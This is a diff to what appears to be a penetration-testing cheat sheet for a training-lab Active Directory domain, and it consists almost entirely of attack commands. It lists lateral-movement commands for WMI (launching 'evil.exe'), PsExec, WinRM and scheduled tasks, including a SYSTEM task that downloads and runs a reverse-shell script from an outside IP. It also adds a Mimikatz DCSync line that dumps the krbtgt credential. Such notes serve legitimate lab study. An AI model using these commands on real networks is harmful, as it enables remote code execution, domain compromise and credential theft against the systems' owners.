@@ -30,6 +30,16 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 ```
 wmi service (HOST + RPCSS)
 ```powershell
+wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"
+
+.\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local ipconfig
+```
+WinRM (HTTP + HOST) - winrm must enable
+```powershell
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+PsExec (CIFS? + HOST?)
+```powershell
 .\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local ipconfig
 ```
 Scheduled Tasks (HOST)
@@ -40,6 +50,10 @@ schtasks /S dcorp-dc.dollarcorp.moneycorp.local
 schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
 # Run
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+```
+DC Sync
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 to do
 - add other services
